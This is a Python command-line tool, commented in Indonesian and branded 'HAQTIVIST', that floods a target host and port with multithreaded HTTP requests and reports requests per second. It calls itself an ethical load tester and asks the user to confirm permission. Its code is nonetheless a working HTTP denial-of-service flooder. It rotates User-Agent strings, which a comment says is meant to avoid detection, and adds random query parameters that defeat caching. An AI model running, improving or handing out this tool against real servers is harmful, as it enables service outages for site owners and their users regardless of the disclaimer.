import socket
import threading
import time
import sys
import random
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# ============ BANNER HOLOGRAM HAQTIVIST (UKURAN KECIL - WARNA KUNING) ============
def print_hologram_banner():
    banner_text = r"""
═══════════════════════════════════════════════════
 ██  ██ ▄████▄ ▄█████▄ ██████ ██ ██  ██ ██ ▄█████ ██████ 
 ██████ ██▄▄██ ██ ▄ ██   ██   ██ ██▄▄██ ██ ▀▀▀▄▄▄   ██   
 ██  ██ ██  ██ ▀█████▀   ██   ██  ▀██▀  ██ █████▀   ██   
                   ▀▀      
                  H A Q T I V I S T   Ethical Security Testing Tool  
═══════════════════════════════════════════════════
    """
    
    # Warna kuning solid untuk semua baris
    for line in banner_text.split('\n'):
        print(Fore.YELLOW + line + Style.RESET_ALL)
        time.sleep(0.02)  # Efek animasi
    
    print(Fore.LIGHTBLACK_EX + "\n" + "="*50)
    print(Fore.YELLOW + f"[+] HAQTIVIST HTTP TESTER v2.0 | Started at {datetime.now().strftime('%H:%M:%S')}")
    print(Fore.LIGHTBLACK_EX + "="*50 + "\n")

# ============ KONFIGURASI & STATISTIK ============
stats = {
    'success': 0,
    'fail': 0,
    'timeout': 0,
    'error': 0,
    'total_requests': 0,
    'bytes_transferred': 0,
    'response_times': []
}

lock = threading.Lock()
stop_flag = threading.Event()


def generate_user_agent():
    """Random User-Agent untuk menghindari deteksi"""
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
    ]
    return random.choice(agents)

def live_stats_display(threads_active, elapsed, rps):
    """Tampilan statistik real-time"""
    sys.stdout.write(f"\r\033[K")  # Clear line
    sys.stdout.write(f"{Fore.YELLOW}⚡ Active: {threads_active} | "
                     f"{Fore.GREEN}✓ Success: {stats['success']} | "
                     f"{Fore.RED}✗ Fail: {stats['fail']} | "
                     f"{Fore.CYAN}📊 RPS: {rps:.1f} | "
                     f"{Fore.MAGENTA}⏱️ Elapsed: {elapsed:.1f}s{Style.RESET_ALL}")
    sys.stdout.flush()

def test_request_advanced(target, port, endpoint="/", method="GET", use_proxy=False):
    """HTTP Request dengan fitur advanced"""
    global stats
    start_time = time.time()
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        
        # Generate random parameter
        random_param = f"?id={random.randint(1000,9999)}&t={int(time.time())}"
        
        # Header lengkap seperti browser real
        request = f"{method} {endpoint}{random_param} HTTP/1.1\r\n"
        request += f"Host: {target}\r\n"
        request += f"User-Agent: {generate_user_agent()}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: id-ID,id;q=0.9,en;q=0.8\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Upgrade-Insecure-Requests: 1\r\n"
        request += "\r\n"
        
        s.send(request.encode())
        response = s.recv(4096)
        response_time = time.time() - start_time
        
        with lock:
            stats['total_requests'] += 1
            stats['bytes_transferred'] += len(response)
            stats['response_times'].append(response_time)
            
            # Analisis response code
            response_str = response[:50].decode('utf-8', errors='ignore')
            if "200" in response_str or "301" in response_str or "302" in response_str:
                stats['success'] += 1
                status = Fore.GREEN + "✓ OK"
            elif "403" in response_str:
                stats['fail'] += 1
                status = Fore.YELLOW + "⚠ Forbidden"
            elif "404" in response_str:
                stats['fail'] += 1
                status = Fore.YELLOW + "✗ Not Found"
            elif "500" in response_str or "502" in response_str or "503" in response_str:
                stats['fail'] += 1
                status = Fore.RED + "🔥 Server Error"
            else:
                stats['fail'] += 1
                status = Fore.LIGHTBLACK_EX + f"Code: {response_str[:15]}"
            
            # Optional detail print (dikurangi spam)
            if random.random() < 0.05:  # Hanya 5% request yang ditampilkan
                print(f"\n{status} | {response_time*1000:.1f}ms | {target}:{port}{endpoint}")
        
        s.close()
        
    except socket.timeout:
        with lock:
            stats['timeout'] += 1
            stats['fail'] += 1
            stats['total_requests'] += 1
    except socket.error as e:
        with lock:
            stats['error'] += 1
            stats['fail'] += 1
            stats['total_requests'] += 1
    except Exception as e:
        with lock:
            stats['error'] += 1
            stats['fail'] += 1
            stats['total_requests'] += 1

def worker_optimized(target, port, endpoint, method, duration, delay=0):
    """Worker dengan delay adjustable"""
    start_time = time.time()
    request_count = 0
    
    while not stop_flag.is_set() and (time.time() - start_time) < duration:
        test_request_advanced(target, port, endpoint, method)
        request_count += 1
        
        # Dynamic delay berdasarkan kondisi server
        if delay > 0:
            time.sleep(delay)
        elif stats['fail'] > 100 and request_count % 50 == 0:
            time.sleep(0.05)  # Slow down jika banyak error

def attack_mode(target, port, endpoint, duration, threads, method="GET", delay=0):
    """Mode serangan (untuk testing server sendiri dengan izin)"""
    print(f"\n{Fore.YELLOW}[+] Memulai test mode ke {target}:{port}{endpoint}")
    print(f"{Fore.LIGHTBLACK_EX}[!] Threads: {threads} | Duration: {duration}s | Method: {method} | Delay: {delay}s")
    print(f"{Fore.RED}[!] PERINGATAN: Hanya untuk server milik sendiri!\n")
    
    start_time = time.time()
    thread_list = []
    
    try:
        for _ in range(threads):
            t = threading.Thread(target=worker_optimized, args=(target, port, endpoint, method, duration, delay))
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Live stats display selama pengujian
        last_update = time.time()
        last_requests = 0
        
        while any(t.is_alive() for t in thread_list):
            time.sleep(0.5)
            elapsed = time.time() - start_time
            
            if elapsed >= duration:
                stop_flag.set()
                break
            
            # Hitung RPS setiap 1 detik
            if time.time() - last_update >= 1:
                with lock:
                    current_requests = stats['total_requests']
                    rps = current_requests - last_requests
                    last_requests = current_requests
                    
                    live_stats_display(threads, elapsed, rps)
                    last_update = time.time()
        
        for t in thread_list:
            t.join(timeout=1)
            
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Test dihentikan oleh user")
        stop_flag.set()

def show_final_report(start_timestamp):
    """Laporan akhir dengan analisis lengkap"""
    elapsed = time.time() - start_timestamp
    
    print(f"\n\n{Fore.YELLOW}{'='*50}")
    print(f"{Fore.YELLOW}📊 HASIL AKHIR HAQTIVIST HTTP TESTER")
    print(f"{Fore.YELLOW}{'='*50}")
    
    print(f"{Fore.WHITE}\n📈 STATISTIK REQUEST:")
    print(f"  {Fore.GREEN}✓ Sukses (2xx/3xx): {stats['success']}")
    print(f"  {Fore.YELLOW}⚠ Gagal (4xx): {stats['fail'] - stats['timeout'] - stats['error']}")
    print(f"  {Fore.RED}⌛ Timeout: {stats['timeout']}")
    print(f"  {Fore.RED}💥 Error Socket: {stats['error']}")
    print(f"  {Fore.WHITE}📦 Total Request: {stats['total_requests']}")
    
    print(f"{Fore.WHITE}\n⚡ PERFORMANCE:")
    print(f"  {Fore.YELLOW}🕒 Durasi: {elapsed:.2f} detik")
    print(f"  {Fore.YELLOW}🚀 Rata-rata RPS: {stats['total_requests']/elapsed:.1f} req/detik")
    
    if stats['response_times']:
        avg_response = sum(stats['response_times']) / len(stats['response_times']) * 1000
        min_response = min(stats['response_times']) * 1000
        max_response = max(stats['response_times']) * 1000
        print(f"  {Fore.YELLOW}⏱️  Response Time (avg): {avg_response:.1f}ms")
        print(f"  {Fore.YELLOW}⏱️  Response Time (min/max): {min_response:.1f}/{max_response:.1f}ms")
    
    print(f"{Fore.WHITE}\n💾 BANDWIDTH:")
    print(f"  {Fore.YELLOW}📤 Total Transfer: {stats['bytes_transferred']/1024/1024:.2f} MB")
    print(f"  {Fore.YELLOW}📤 Rata-rata Transfer: {stats['bytes_transferred']/1024/elapsed:.1f} KB/s")
    
    # Success rate
    success_rate = (stats['success'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
    print(f"{Fore.WHITE}\n🎯 SUCCESS RATE: ", end="")
    if success_rate >= 90:
        print(f"{Fore.GREEN}{success_rate:.1f}% (Excellent)")
    elif success_rate >= 70:
        print(f"{Fore.YELLOW}{success_rate:.1f}% (Good)")
    elif success_rate >= 50:
        print(f"{Fore.MAGENTA}{success_rate:.1f}% (Average)")
    else:
        print(f"{Fore.RED}{success_rate:.1f}% (Poor)")
    
    print(f"{Fore.YELLOW}{'='*50}")
    print(f"{Fore.LIGHTBLACK_EX}Test completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{Fore.LIGHTBLACK_EX}HAQTIVIST - For Ethical Testing Only")

# ============ MAIN ============
if __name__ == "__main__":
    print_hologram_banner()
    
    if len(sys.argv) < 5:
        print(f"{Fore.YELLOW}Usage: python haqtivist.py <IP> <PORT> <THREADS> <DURATION_SEC> [METHOD] [DELAY]")
        print(f"{Fore.CYAN}\nContoh:")
        print(f"  python haqtivist.py localhost 8080 10 5")
        print(f"  python haqtivist.py localhost 8080 50 10 POST")
        print(f"  python haqtivist.py 192.168.1.1 80 20 30 GET 0.05")
        print(f"\n{Fore.RED}PERINGATAN: Hanya untuk testing server milik sendiri!")
        print(f"{Fore.RED}Penggunaan tanpa izin adalah tindakan ilegal!")
        sys.exit()
    
    target = sys.argv[1]
    port = int(sys.argv[2])
    threads = int(sys.argv[3])
    duration = int(sys.argv[4])
    method = sys.argv[5].upper() if len(sys.argv) > 5 else "GET"
    delay = float(sys.argv[6]) if len(sys.argv) > 6 else 0
    
    # Konfirmasi
    print(f"{Fore.RED}[!] KONFIRMASI: Apakah Anda memiliki izin untuk testing ke {target}:{port}? (y/N): ", end="")
    confirm = input().lower()
    
    if confirm != 'y':
        print(f"{Fore.RED}Dibatalkan. Testing hanya boleh dilakukan dengan izin pemilik server!")
        sys.exit()
    
    start_time = time.time()
    attack_mode(target, port, "/", duration, threads, method, delay)
    show_final_report(start_time)
